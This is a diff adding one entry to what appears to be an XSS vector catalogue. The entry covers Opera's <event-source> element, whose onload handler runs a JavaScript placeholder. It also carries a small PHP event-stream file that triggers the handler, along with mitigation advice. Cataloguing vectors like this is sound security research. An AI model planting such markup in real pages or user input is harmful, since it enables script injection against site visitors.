@@ -2277,5 +2277,41 @@ var items =
         },
         'tags'       : ['xss', 'html5', 'opera', 'formaction', 'javascript', 'button'],
         'reporter'   : '.mario'
-    }    
+    },
+    { /* ID 73 - Server-sent events - Opera and <EVENT-SOURCE> tags */
+        'id'         : 73,
+        'category'   : 'binding', 
+        'name'       : {
+            'en' : 'Server-sent events - Opera and <EVENT-SOURCE> tags',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },
+        'data'       : '<event-source src="%event_path%" onload="%js_alert%">',
+        'attachment' : {
+            'required_mime' : '',
+            'samedomain'    : '0',            
+            'path'          : 'http://heideri.ch/jso/event.php',
+            'name'          : 'event.php',
+            'raw'           : '<?php\r\nheader("Content-Type: application/x-dom-event-stream");\r\ndie("Event: load\ndata: \n\n");\r\n?>'
+        },
+        'description': {
+            'en' : 'Opera allows using <EVENT-SOURCE> elements. In case the "src" attribute points to a valid cross domain source it\'s possible to have the element listen for events and the containing data.',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },
+        'urls'    : ['http://hixie.ch/specs/html/server-sent-events/server-sent-events'],
+        'howtofix'   : {
+            'en' : 'Make sure users cannot influence the source of <EVENT-SOURCE> elements and don\'t whitelist the tag itself inside user submitted markup.',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },                        
+        'browsers'   : {
+            'opera': ['8.x', '9.x', '10.x', 'mobile']
+        },
+        'tags'       : ['xss', 'javascript', 'event-source', 'opera', 'sse'],
+        'reporter'   : '.mario'
+    }   
 ]
